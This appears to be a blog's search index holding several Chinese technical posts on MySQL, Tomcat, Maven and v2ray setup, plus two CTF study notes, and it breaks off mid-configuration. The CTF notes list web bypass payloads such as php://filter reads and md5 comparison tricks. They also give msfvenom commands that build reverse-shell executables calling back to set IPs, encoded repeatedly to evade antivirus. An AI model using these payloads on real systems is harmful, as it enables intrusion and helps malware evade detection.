<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>修改brew安装的mysql配置</title>
      <link href="2022/xiu-gai-brew-an-zhuang-de-mysql-pei-zhi/"/>
      <url>2022/xiu-gai-brew-an-zhuang-de-mysql-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>作者之前一直是<code>Docker</code>党，不管在什么平台上，都一直使用<code>Docker</code>进行一些容器、环境的搭建。直到我发现<code>Docker</code>在其它操作系统上的性能问题，就同一个sql，在<code>Docker For Mac</code>执行需要7s+，Mac本地<code>Mysql</code>只需要2s左右，<code>Windows Wsl2 Docker</code>大概是2s~3s（Windows平台配置和Mac不一样，没有参考性）。可以不难发现，<code>Docker For Mac</code>在高版本的Mac上使用了全新<code>Hypervisor</code>，但是性能上并没有多少大的提升，特别是IO读写性能上，和原生差别还是非常大的，这里我放一篇文章，大家可以自行阅读专不专业我就不知道了，自己看吧，<a href="https://accesto.com/blog/docker-on-mac-how-to-speed-it-up/">各平台基准测试和选择</a>。<code>Docker For Wsl2</code>的话，作者感觉还是不错的，但IO性能听说也是有点不太行。但<code>Windows</code>上使用<code>Docker</code>还是能用的，平时用来跑几个版本的<code>Mysql</code>、<code>Redis</code>这些开发环境还是不错的，容器也比较好管理。说了这么多，作者目前是Mac做为主力开发系统，所以最后还是向性能妥协了，直接在Mac上装原生的Mysql，其实并没有比<code>Docker</code>复杂。下面是教程。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><code>brew install mysql@5.7</code>  //安装mysql5.7</p><p><code>brew install mysql</code>   //默认会安装最新的Mysql</p><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><p>我不太推荐像网上其它人那样启动，其实brew是有service命令可以管理启动的。我放个文章，具体可以自行浏览，<a href="https://gist.github.com/wen-long/f86a4e3ba55ee2ebcd44">brew serivces</a></p><p><code>brew services start mysql@5.7</code> 就可以启动mysql5.7</p><h2 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h2><p>执行<code>mysql --help</code>然后在输出中找到<code>Mysql</code>的配置文件地址。</p><pre><code>Default options are read from the following files in the given order:/etc/my.cnf /etc/mysql/my.cnf /usr/local/etc/my.cnf ~/.my.cnf</code></pre><p>我一般会直接改<code>~/.my.cnf</code>，把自己的SQL_MODE加入到文件中，就可以了。</p><p><code>/usr/local/etc/my.cnf</code>可以修改绑定的IP，如果需要监听所有地址，就把<code>127.0.0.1</code>改成<code>0.0.0.0</code>就好了。</p>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Code </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OOM解决和性能调优</title>
      <link href="2021/oom-jie-jue-he-xing-neng-diao-you/"/>
      <url>2021/oom-jie-jue-he-xing-neng-diao-you/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>新接手一个项目，扎眼一看，源码加各种依赖Jar一起接近一个G，不太妙。还是先把项目跑起来吧。打开项目发现还是 <code>Eclipse</code> 的项目，可我早就是 <code>Idea</code> 党了。一顿操作后终于还是在Idea中跑起来了这个项目，但是项目加载到一半就报出一个错误 <code>java.lang.OutOfMemoryError: PermGen space</code>。一看就知道是OOM了，默认的内存大小竟然还跑不动这项目。</p><h2 id="Tomcat内存调整"><a href="#Tomcat内存调整" class="headerlink" title="Tomcat内存调整"></a>Tomcat内存调整</h2><h3 id="1-在Idea中调整"><a href="#1-在Idea中调整" class="headerlink" title="1.在Idea中调整"></a>1.在Idea中调整</h3><p>在Idea中编辑配置在VM options填入 <code>-server -Xms2048m -Xmx4096m -XX:MaxNewSize=2048m -XX:MaxPermSize=4096m</code><br>解析：<a href="https://zhuanlan.zhihu.com/p/43158214">https://zhuanlan.zhihu.com/p/43158214</a><br><img src="https://raw.githubusercontent.com/lyl12321/picture/master/uPic/TT34ja.png" alt="TT34ja"></p><h3 id="2-在Tomcat配置文件中调整"><a href="#2-在Tomcat配置文件中调整" class="headerlink" title="2.在Tomcat配置文件中调整"></a>2.在Tomcat配置文件中调整</h3><p>修改 <code>Tomcat</code> 的内存配置，打开 <code>$TOMCAT_HOME/bin/catalina.sh</code> 文件（ <code>Windows</code> 系统是 <code>catalina.bat</code> 文件）<br><code>Linux</code> 在 <code>cygwin=false</code> 前加上 <code>JAVA_OPTS="-server -Xms2048m -Xmx4096m -XX:MaxNewSize=2048m -XX:MaxPermSize=4096m"</code>,<code>Windows</code> 在第一行加。</p><h2 id="Tomcat调优"><a href="#Tomcat调优" class="headerlink" title="Tomcat调优"></a>Tomcat调优</h2><p>项目是跑起来了，既然都调整内存了，那就干脆把 <code>Tomcat</code> 的调优参数一块看一下吧。</p><h3 id="JVM调整"><a href="#JVM调整" class="headerlink" title="JVM调整"></a>JVM调整</h3><p><code>-server</code> 参数：表示以服务模式启动，启动速度会稍微慢一点，但性能会高很多。不加这个参数，默认是以客户端模式启动。<br><code>java.awt.headless=true</code> 参数：与图形操作有关，适用于linux系统。如生成验证码，含义是当前使用的是没有安装图安装图形界面的服务器，应用中如果获取系统显示有关参数会抛异常。<br><code>-XX:PermSize</code> 设置永久代初始值，默认是物理内存的1/64。java1.8以后不起作用了，改成了元空间，对应参数 <code>-XX:MetaspaceSize</code><br><code>-XX:MetaspaceSize</code>，初始空间大小，达到该值就会触发垃圾收集进行类型卸载，同时GC会对该值进行调整：如果释放了大量的空间，就适当降低该值；如果释放了很少的空间，那么在不超过MaxMetaspaceSize时，适当提高该值。<br><code>-XX:MaxMetaspaceSize</code> ，最大空间，默认是没有限制的。<br><code>XX:MaxPermSize</code> 设置最大非堆内存的大小，默认是物理内存的1/4。java1.8以后不起作用了，改成了元空间，对应参数 <code>-XX:MaxMetaspaceSize -Xms</code>、-Xmx：JVM内存设置（堆内存）。<br>ps：这两组最好设置成一样的，避免上下文切换消耗资源。JDK8+永久代已经换成了元空间，PermSize MaxPermSize这两个参数没用了。<br><code>-XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/path</code> oom时打印dump文件到指定路径</p><h3 id="server-xml修改"><a href="#server-xml修改" class="headerlink" title="server.xml修改"></a>server.xml修改</h3><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Connector</span><span class="token attr-name">port</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>8080<span class="token punctuation">"</span></span>  <span class="token attr-name">protocol</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.apache.coyote.http11.Http11NioProtocol<span class="token punctuation">"</span></span> <span class="token attr-name">enableLookups</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span>            <span class="token attr-name">maxThreads</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1000<span class="token punctuation">"</span></span>               <span class="token attr-name">minSpareThreads</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span>                            <span class="token attr-name">acceptCount</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>5000<span class="token punctuation">"</span></span>               <span class="token attr-name">disableUploadTimeout</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span>              <span class="token attr-name">connectionTimeout</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>30000<span class="token punctuation">"</span></span>               <span class="token attr-name">URIEncoding</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span>                           <span class="token attr-name">redirectPort</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>8443<span class="token punctuation">"</span></span>               <span class="token attr-name">compression</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>on<span class="token punctuation">"</span></span>              <span class="token attr-name">compressionMinSize</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1024<span class="token punctuation">"</span></span> <span class="token attr-name">useSendfile</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span><span class="token attr-name">noCompressionUserAgents</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>gozilla, traviata<span class="token punctuation">"</span></span>            <span class="token attr-name">compressibleMimeType</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html,text/xml,text/plain,text/css,text/javascript,application/javascript <span class="token punctuation">"</span></span>   <span class="token punctuation">/></span></span></code></pre><p><code>org.apache.coyote.http11.Http11NioProtocol</code>：调整工作模式为Nio<br><code>maxThreads</code>：最大线程数，默认150。增大值避免队列请求过多，导致响应缓慢。<br><code>minSpareThreads</code>：最小空闲线程数。<br><code>acceptCount</code>：当处理请求超过此值时，将后来请求放到队列中等待。<br><code>disableUploadTimeout</code>：禁用上传超时时间<br><code>connectionTimeout</code>：连接超时，单位毫秒，0代表不限制<br><code>URIEncoding</code>：URI地址编码使用UTF-8<br><code>enableLookups</code>：关闭dns解析，提高响应时间<br><code>compression</code>：启用压缩功能<br><code>compressionMinSize</code>：最小压缩大小，单位Byte<br><code>compressibleMimeType</code>：压缩的文件类型</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>遇到问题可以先去官网看看，一般官网都有文档和详细的介绍Tomcat参数官网 <a href="http://tomcat.apache.org/tomcat-9.0-doc/config/http.html">http://tomcat.apache.org/tomcat-9.0-doc/config/http.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql中遇到的问题--持续更</title>
      <link href="2021/mysql-zhong-yu-dao-de-wen-ti-chi-xu-geng/"/>
      <url>2021/mysql-zhong-yu-dao-de-wen-ti-chi-xu-geng/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇文章只在总结我自己在一些实际项目中遇到的问题</p><h2 id="group-concat-函数排序"><a href="#group-concat-函数排序" class="headerlink" title="group_concat()函数排序"></a>group_concat()函数排序</h2><p>如果是多表查询，并且多个列使用了group_concat函数，其中有列用了排序，那么其他使用了函数的列也要用上排序，否则数据对应就有误。正确处理group_concat(字段名 oder by 字段名 desc或asc</p><h2 id="mysql不同版本特性"><a href="#mysql不同版本特性" class="headerlink" title="mysql不同版本特性"></a>mysql不同版本特性</h2><p>在mysql8.0以下的版本不会有 <code>only_full_group_by</code> 问题，但当版本到了8.0之后，就会出现这个问题。在mysql8.0以上的版本中，对于 group by 的这种聚合操作，如果在select 中的列，没有在group by 中出现，那么这个SQL是不合法的，因为列不在group by的从句中，所以对于设置了这个mode的数据库，在使用group&nbsp;by&nbsp;的时候，就要用MAX()，SUM()，ANT_VALUE()的这种聚合函数，才能完成GROUP&nbsp;BY&nbsp;的聚合操作。怎么解决呢？主要是调整<code>sql_mode</code>。</p><p>sql_mode这个变量，很容易被忽视，默认值是空值，在这种设置下是可以允许一些非法操作的，比如允许一些非法数据的插入。在生产环境必须将这个值设置为严格模式，所以开发、测试环境的数据库也必须要设置，这样在开发测试阶段就可以发现问题。</p><p><code>sql_mode</code> 常用值如下：&nbsp;<br><code>ONLY_FULL_GROUP_BY</code> ：对于GROUP BY聚合操作，如果在 SELECT 中的列，没有在 GROUP BY 中出现，那么这个SQL是不合法的，因为列不在GROUP BY从句中。<br><code>NO_AUTO_VALUE_ON_ZERO</code> ：该值影响自增长列的插入。默认设置下，插入0或NULL代表生成下一个自增长值。如果用户&nbsp;希望插入的值为0，而该列又是自增长的，那么这个选项就有用了。<br><code>STRICT_TRANS_TABLES</code> ：在该模式下，如果一个值不能插入到一个事务表中，则中断当前的操作，对非事务表不做限制<br><code>NO_ZERO_IN_DATE</code> ：在严格模式下，不允许日期和月份为零<br><code>NO_ZERO_DATE</code> ：设置该值，mysql数据库不允许插入零日期，插入零日期会抛出错误而不是警告。<br><code>ERROR_FOR_DIVISION_BY_ZERO</code> ：在INSERT或UPDATE过程中，如果数据被零除，则产生错误而非警告。如&nbsp;果未给出该模式，那么数据被零除时MySQL返回NULL<br><code>NO_AUTO_CREATE_USER</code> ：禁止GRANT创建密码为空的用户<br><code>NO_ENGINE_SUBSTITUTION</code> ：如果需要的存储引擎被禁用或未编译，那么抛出错误。不设置此值时，用默认的存储引擎替代，并抛出一个异常<br><code>PIPES_AS_CONCAT</code> ：将”||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似<br><code>ANSI_QUOTES</code>：启用ANSI_QUOTES后，不能用双引号来引用字符串，因为它被解释为识别符</p><p>说明介绍完了，但是在8.0中这么设置下依然会报错，原因如下：<br>ERROR 1231 (42000): Variable ‘sql_mode’ can’t be set to the value of ‘NO_AUTO_CREATE_USER’</p><p>8.0以上已经取消了 <code>NO_AUTO_CREATE_USER这个关键字</code> ，删掉sql语句中的这个关键字即可</p><p>最终，<code>/etc/my.cnf</code> 配置文件中&nbsp; 修改&nbsp;<br><code>sql_mode='STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION'</code></p><p>重启mysql服务，大功告成！~</p><p>第二种办法不用修改配置文件，直接使用命令行<br><code>set&nbsp;GLOBAL&nbsp;sql_mode = 'STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION';</code> 但是这个方法是临时更改，重启mysql后又回复原。</p><p><code>Linux</code> 上的 <code>Mysql</code> 重启后，你在 <code>Mysql</code> 命令行上设置的就不再有效，而是依据你指定的配置文件中的设定，就是 <code>my.cnf</code> 这个文件中设定</p><h2 id="日期和字符相互转换方法"><a href="#日期和字符相互转换方法" class="headerlink" title="日期和字符相互转换方法"></a>日期和字符相互转换方法</h2><p><code>mysql</code> 中用 <code>date_format(date,'%Y-%m-%d')</code> 等于 <code>oracle</code> 中的 <code>to_char()</code><br><code>mysql</code> 中用 <code>str_to_date(date,'%Y-%m-%d')</code> 等于 <code>oracle</code> 中的<code>to_date()</code></p><h2 id="分页查询"><a href="#分页查询" class="headerlink" title="分页查询"></a>分页查询</h2><p><code>mysql</code> 是直接在SQL语句中写 <code>limit  x, y</code> ,有limit就可以实现分页;而<code>oracle</code> 则是需要用到伪列ROWNUM和嵌套查询</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
            <tag> Oracle </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Maven设置代理</title>
      <link href="2020/maven-she-zhi-dai-li/"/>
      <url>2020/maven-she-zhi-dai-li/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为一些原因，Maven的下载速度非常的慢，所以要给Maven加个速。一共有两种方法，个人比较推荐第一种。</p><h2 id="通过settings-xml设置"><a href="#通过settings-xml设置" class="headerlink" title="通过settings.xml设置"></a>通过settings.xml设置</h2><ol><li>编辑/Users/你的用户名/.m2/settings.xml(如果没有这个文件的话，就新建一个)，windows路径：系统盘:/Users/你的用户名/.m2/settings.xml</li><li>添加配置<pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>settings</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>proxies</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>proxy</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>workProxy<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>active</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>active</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>protocol</span><span class="token punctuation">></span></span>http<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>protocol</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>host</span><span class="token punctuation">></span></span>172.17.13.12<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>host</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>port</span><span class="token punctuation">></span></span>8088<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>port</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nonProxyHosts</span><span class="token punctuation">></span></span>local.net|some.host.com<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>nonProxyHosts</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>proxy</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>proxies</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>settings</span><span class="token punctuation">></span></span></code></pre>id：可选，可以配置多个代理节点（proxy）<br>active：true/false，true的话说明该代理配置激活使用<br>protocol：http，代理的协议，这里就是http<br>username：用户名，代理需要账号校验时填写，否则注释掉或者直接删除<br>password：密码，代理需要账号校验时填写，否则注释掉或者直接删除<br>host：代理ip<br>port：代理端口<br>nonProxyHosts：无需经过代理访问的网站，多个的话通过|隔开</li></ol><h2 id="通过Idea设置"><a href="#通过Idea设置" class="headerlink" title="通过Idea设置"></a>通过Idea设置</h2><ol><li>打开 <code>Preferences</code> &gt; <code>Build,Execution,Deployment</code> &gt; <code>Build Tools</code> &gt; <code>Maven</code> &gt; <code>Importing</code> &gt; <code>VM options for importer</code> 填入 <code>-DproxySet=true -DproxyHost=127.0.0.1 -DproxyPort=1081</code> 其中 <code>DproxyHost</code>为你的主机地址 <code>DproxyPort</code>为你的端口号</li><li>打开 <code>Preferences</code> &gt; <code>Build,Execution,Deployment</code> &gt; <code>Build Tools</code> &gt; <code>Maven</code> &gt; <code>Runner</code> &gt; <code>VM Options</code> 填入 <code>-DproxySet=true -DproxyHost=127.0.0.1 -DproxyPort=1081</code> 其中 <code>DproxyHost</code>为你的主机地址 <code>DproxyPort</code>为你的端口号</li></ol><p>这个方法是 <code>For current project</code> 也就是只对当前项目生效，切换项目的话，需要重新配置。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Code </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF常见绕过</title>
      <link href="2020/ctf-chang-jian-rao-guo/"/>
      <url>2020/ctf-chang-jian-rao-guo/</url>
      
        <content type="html"><![CDATA[<h2 id="指定ip访问绕过"><a href="#指定ip访问绕过" class="headerlink" title="指定ip访问绕过"></a>指定ip访问绕过</h2><p>在头中添加 X-Forwarded-For</p><h2 id="php-filter读取任意-php文件"><a href="#php-filter读取任意-php文件" class="headerlink" title="php:filter读取任意.php文件"></a>php:filter读取任意.php文件</h2><p><code>php://filter/read=convert.base64-encode/resource=xx.php</code></p><h2 id="实战常用后门"><a href="#实战常用后门" class="headerlink" title="实战常用后门"></a>实战常用后门</h2><p>使用后门扫描工具</p><h2 id="php双"><a href="#php双" class="headerlink" title="php双$$"></a>php双$$</h2><p>表示可变变量 <a href="https://blog.csdn.net/A757291228/article/details/57083568">https://blog.csdn.net/A757291228/article/details/57083568</a></p><h2 id="md5绕过"><a href="#md5绕过" class="headerlink" title="md5绕过"></a>md5绕过</h2><p>== 双等于使用 0e方法绕过<br>=== 三等于使用传数组方法绕过<br>有两种方法绕过：<br>1，md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。<br>payload: ?kkeyey1[]=1&amp;kkeyey2[]=2<br>2，利用==比较漏洞<br>如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。<br>下列的字符串的MD5值都是0e开头的：<br>QNKCDZO<br>240610708<br>s878926199a<br>s155964671a<br>s214587387a<br>s214587387a</p><h2 id="修改HTTP头中的referer伪造访问来源"><a href="#修改HTTP头中的referer伪造访问来源" class="headerlink" title="修改HTTP头中的referer伪造访问来源"></a>修改HTTP头中的referer伪造访问来源</h2><p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，<br>告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。</p><h2 id="php常见漏洞总结"><a href="#php常见漏洞总结" class="headerlink" title="php常见漏洞总结"></a>php常见漏洞总结</h2><p><a href="https://xz.aliyun.com/t/3085">https://xz.aliyun.com/t/3085</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络技巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>msfvenom生成</title>
      <link href="2020/msfvenom-sheng-cheng/"/>
      <url>2020/msfvenom-sheng-cheng/</url>
      
        <content type="html"><![CDATA[<h2 id="利用msfvenom生成木马程序"><a href="#利用msfvenom生成木马程序" class="headerlink" title="利用msfvenom生成木马程序"></a>利用msfvenom生成木马程序</h2><p>msfvenom -h</p><p>生成meterpreter payload 并利用shikata_ga_nai编码,查看所需选项,利用 -o参数</p><p>msfvenom -p windows/meterpreter/reverse_tcp -o</p><p>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\x00’ LHOST=192.168.1.113 LPORT=443 -f exe &gt; abc.exe</p><p>msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.113 X &gt; Desktop/abc.exe</p><p>多次生成可进行免杀:msfpayload windows/shell_reverse_tcp lhost=192.168.128.129 lport=888 r| msfencode -e x86/shikata_ga_nai -c 7 -t raw | msfencode -e x86/alpha_upper -c 3 -t raw | msfencode -e x86/shikata_ga_nai -c 6 -t raw | msfencode -e x86/alpha_upper -c 3 -t exe -o /root/Desktop/acn.exe</p><p>upx加壳：upx -5 /root/Desktop/acn.exe</p>]]></content>
      
      
      <categories>
          
          <category> CTF学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络技巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>magisk v2ray 食用教程</title>
      <link href="2020/magisk-v2ray-shi-yong-jiao-cheng/"/>
      <url>2020/magisk-v2ray-shi-yong-jiao-cheng/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>最近我在看magisk模块的时候，发现了一个比较好用的模块，那就是magisk版的v2ray工具。</p><p>作为模块，他可以一直在后台运行，而且非系统VPN模式。就是状态栏不会有啥图标。强迫症患者首选。</p><p>这是他的项目地址<a href="https://github.com/Magisk-Modules-Repo/v2ray">Github项目</a>，怎么下载，怎么安装这里就不复述了</p><p>大神可以自己去看他的README，我这里分享一下我自己的过程，心得供大家参考。</p><p>教程仅供学习与交流使用，请勿用于非法用途。</p><h2 id="0x01入门"><a href="#0x01入门" class="headerlink" title="0x01入门"></a>0x01入门</h2><p>安装完成后你的<code>/data/</code>目录下会生成一个<code>v2ray</code>的文件夹，这里存放着各种配置等文件。<br><img src="https://raw.githubusercontent.com/lyl12321/picture/master/Screenshot_2020.webp"></p><p>首先配置我们的<code>config.json</code>文件，此文件为<code>v2ray</code>的主要配置文件，里面有出站和入站规则等。</p><p>使用编辑器打开<code>/data/v2ray/config.json</code>这个文件，我这里用的是es文件浏览器自带的编辑器，用其它也可以。</p><p>然后将自己服务器配置<code>outbounds</code>部分的第一个元素复制到刚打开的文件的相同位置，点击保存。<br><img src="https://raw.githubusercontent.com/lyl12321/picture/master/QQ20200228-172704%402x.webp"></p><p>再打开<code>/data/v2ray/appid.list</code>这个文件，在文件内填入数字<code>0</code>。然后保存。解释一下：这个文件是用于分应用代理的，如果有这需求的友友们请查看本篇文章的进阶部分。<br><img src="https://raw.githubusercontent.com/lyl12321/picture/master/Screenshot_2020-02-28.webp"></p><p>然后回到<code>Magisk Manager</code>应用中，重启v2ray for android模块（就是禁用再打开，看下图）<br><img src="https://raw.githubusercontent.com/lyl12321/picture/master/IMG_20200228_185919.webp"></p><p>开始美妙的玩耍之路吧！！</p><h2 id="0x02进阶"><a href="#0x02进阶" class="headerlink" title="0x02进阶"></a>0x02进阶</h2><p>进阶配置稍微比入门的要难一些，但带来的好处也是显而易见的，例如分应用代理减少耗电，应用新的规则识别更准确。</p><p>此板块中简单的操作将不再赘述，有需要的可以看看前面的。</p><h3 id="配置分应用代理"><a href="#配置分应用代理" class="headerlink" title="配置分应用代理"></a>配置分应用代理</h3><p>打开<code>/data/v2ray/appid.list</code>文件，分应用代理使用app的uid来区分每一个应用程序，文件的格式为：每个uid以 <strong>空格</strong> 或 <strong>换行</strong> 来分割。</p><p>app的uid一般存在于<code>/data/system/packages.list</code>，您可以直接查看此文件来获取每个应用的uid。当然也有软件可以使用，例如<code>DevCheck</code>,<code>Solid Explorer</code>这些应用也可以进行查看。下方我以DevCheck为例。<br><img src="https://raw.githubusercontent.com/lyl12321/picture/master/Screenshot_2020-02-28-19-00-25.webp"></p><p>当然我也写了一个方便配置app uid的应用，这个应用可以把包名直接转换成uid，包名可以直接从其它软件中直接导出。需要的在评论区留言一下，我会发出来<br><img src="https://raw.githubusercontent.com/lyl12321/picture/master/Screenshot1.webp"></p><h3 id="应用新路由规则"><a href="#应用新路由规则" class="headerlink" title="应用新路由规则"></a>应用新路由规则</h3><p>在<code>/data/v2ray/</code>目录下有geoip.dat和geosite.dat两个文件，这两文件中有一些规则，可以实现类似Gxx的功能，也就是可以指定哪些网站需要代理，哪些不需要。</p><p>首先我们需要去下载比较强大的规则集，这是他的项目地址<a href="https://github.com/Loyalsoldier/v2ray-rules-dat">Github项目</a></p><p>我们需要下载上方两个文件，下载地址直接放出来：<br><a href="https://github.com/Loyalsoldier/v2ray-rules-dat/releases/latest/download/geoip.dat">geoip.dat</a>       <a href="https://github.com/Loyalsoldier/v2ray-rules-dat/releases/latest/download/geosite.dat">geosite.dat</a></p><p>下载完成后直接覆盖<code>/data/v2ray/</code>目录里的原文件，然后打开<code>config.json</code>,下面我就直接贴代码了，怎么编辑你们也会的。</p><p>在<code>routing</code>部分下改写部分规则</p><pre class=" language-json"><code class="language-json"><span class="token property">"routing"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"domainStrategy"</span><span class="token operator">:</span> <span class="token string">"IPIfNonMatch"</span><span class="token punctuation">,</span>    <span class="token property">"rules"</span><span class="token operator">:</span> <span class="token punctuation">[</span>      <span class="token punctuation">{</span>        //代理dns请求        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"field"</span><span class="token punctuation">,</span>        <span class="token property">"inboundTag"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"dns-in"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"outboundTag"</span><span class="token operator">:</span> <span class="token string">"dns-out"</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token punctuation">{</span>        //禁用bt下载        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"field"</span><span class="token punctuation">,</span>        <span class="token property">"outboundTag"</span><span class="token operator">:</span> <span class="token string">"direct"</span><span class="token punctuation">,</span>        <span class="token property">"protocol"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"bittorrent"</span><span class="token punctuation">]</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token punctuation">{</span>        //屏蔽广告        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"field"</span><span class="token punctuation">,</span>        <span class="token property">"outboundTag"</span><span class="token operator">:</span> <span class="token string">"block"</span><span class="token punctuation">,</span>        <span class="token property">"domain"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token string">"geosite:category-ads-all"</span>        <span class="token punctuation">]</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token punctuation">{</span>        //代理非大陆地址和speedtest        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"field"</span><span class="token punctuation">,</span>        <span class="token property">"outboundTag"</span><span class="token operator">:</span> <span class="token string">"proxy"</span><span class="token punctuation">,</span>        <span class="token property">"domain"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token string">"geosite:geolocation-!cn"</span><span class="token punctuation">,</span>          <span class="token string">"geosite:speedtest"</span>        <span class="token punctuation">]</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token punctuation">{</span>        //直接放行大陆地址        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"field"</span><span class="token punctuation">,</span>        